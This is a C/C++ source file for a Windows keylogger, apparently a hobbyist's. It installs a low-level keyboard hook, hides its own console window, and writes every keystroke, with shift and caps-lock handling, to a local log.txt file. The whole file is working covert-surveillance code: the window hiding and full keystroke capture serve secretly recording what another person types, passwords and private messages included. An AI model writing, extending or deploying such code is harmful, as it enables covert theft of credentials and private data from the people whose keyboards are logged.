#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>

#include <iostream>
#include <Windows.h>
#include <errno.h>
#include <fstream>

#include <stdio.h>
#include <errno.h>
#include <string.h>
#include <locale.h>
using namespace std;

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
void log(char *str);
char *translate(int vk, int up);

int shift = 0, caps = 0;
ofstream myfile;


//NOTE: some keys not supported: alt, esc, numpad, maybe del

int main(int argc, char *argv[])
{
	/// for hiding the command prompt
	HWND self = GetConsoleWindow();
	ShowWindow(self, SW_HIDE);

	// Attaches our hook to the keyboard?
	HINSTANCE app = GetModuleHandle(NULL);
	SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, app, 0);

	MSG msg;

	myfile.open("log.txt", ios::app);

	//I don't know what GetMessage does, I thought the keyboard hook would just always call the function we gave it?
	while (GetMessage(&msg, NULL, 0, 0) > 0) {
		ShowWindow(self, SW_HIDE);
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	myfile.flush();
	myfile.close();
	return 0;
}



LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT *)lParam;
	char *str = "[X]";
	if (wParam == WM_KEYUP) {
		str = translate(kb->vkCode, 1);
	}
	else if (wParam == WM_KEYDOWN) {
		str = translate(kb->vkCode, 0);
	}
	if (str) log(str);
	return 0;
}



void log(char *str)
{
	cout.write(str, strlen(str));
	myfile.write(str, strlen(str));
	if (strstr(str, " ") || strstr(str, "[CR]")) myfile.flush(); //not sure why this is, if space or control we flush?
}



char* translate(int vk, int up)
{
	if (up) {
		if ((vk == 0x10) || (vk == 0xa0) || (vk == 0xa1)) shift = 0;
		return 0;
	}
	else if ((vk == 0x10) || (vk == 0xa0) || (vk == 0xa1)) {
		shift = 1; return 0;
	}
	char *buf = (char*)malloc(16);
	memset(buf, 0, 16);
	if (vk < 0x29) {
		switch (vk) {
		case 0x08: strcpy(buf, "[BS]"); break;
		case 0x09: strcpy(buf, "[TAB]"); break;
		case 0x0d: strcpy(buf, "[CR]"); break;
		case 0x14: caps ^= 1; break;
		case 0x20: buf[0] = ' '; break;
		case 0x25: strcpy(buf, "[LT]"); break;
		case 0x26: strcpy(buf, "[UP]"); break;
		case 0x27: strcpy(buf, "[RT]"); break;
		case 0x28: strcpy(buf, "[DN]"); break;
		}
		return buf;
	}
	if (vk > 0x69 && vk < 0x70) {
		buf[0] = (char)(vk - 0x40);
	}
	else if (vk > 0x6f && vk < 0x88) {
		sprintf(buf, "[F%d]", vk - 0x6f);
	}
	else if (isalpha(vk)) {
		if (!caps)
			if (shift) { buf[0] = (char)(toupper(vk)); }
			else { buf[0] = (char)(tolower(vk)); }
		else
			if (!shift) { buf[0] = (char)(toupper(vk)); }
			else { buf[0] = (char)(tolower(vk)); }
	}
	else {
		switch (vk) {
		case '1': if (!shift) { buf[0] = (char)vk; }
				  else { buf[0] = '!'; } break;
		case '2': if (!shift) { buf[0] = (char)vk; }
				  else { buf[0] = '@'; } break;
		case '3': if (!shift) { buf[0] = (char)vk; }
				  else { buf[0] = '#'; } break;
		case '4': if (!shift) { buf[0] = (char)vk; }
				  else { buf[0] = '$'; } break;
		case '5': if (!shift) { buf[0] = (char)vk; }
				  else { buf[0] = '%'; } break;
		case '6': if (!shift) { buf[0] = (char)vk; }
				  else { buf[0] = '^'; } break;
		case '7': if (!shift) { buf[0] = (char)vk; }
				  else { buf[0] = '&'; } break;
		case '8': if (!shift) { buf[0] = (char)vk; }
				  else { buf[0] = '*'; } break;
		case '9': if (!shift) { buf[0] = (char)vk; }
				  else { buf[0] = '('; } break;
		case '0': if (!shift) { buf[0] = (char)vk; }
				  else { buf[0] = ')'; } break;
		case 0xba: if (!shift) { buf[0] = ';'; }
				   else { buf[0] = ':'; } break;
		case 0xbb: if (!shift) { buf[0] = '='; }
				   else { buf[0] = '+'; } break;
		case 0xbc: if (!shift) { buf[0] = ','; }
				   else { buf[0] = '<'; } break;
		case 0xbd: if (!shift) { buf[0] = '-'; }
				   else { buf[0] = '_'; } break;
		case 0xbe: if (!shift) { buf[0] = '.'; }
				   else { buf[0] = '>'; } break;
		case 0xbf: if (!shift) { buf[0] = '/'; }
				   else { buf[0] = '?'; } break;
		case 0xc0: if (!shift) { buf[0] = '`'; }
				   else { buf[0] = '~'; } break;
		case 0xdb: if (!shift) { buf[0] = '['; }
				   else { buf[0] = '{'; } break;
		case 0xdc: if (!shift) { buf[0] = '\\'; }
				   else { buf[0] = '|'; } break;
		case 0xdd: if (!shift) { buf[0] = ']'; }
				   else { buf[0] = '}'; } break;
		case 0xde: if (!shift) { buf[0] = '\''; }
				   else { buf[0] = '\"'; } break;
		}
	}
	return buf;
}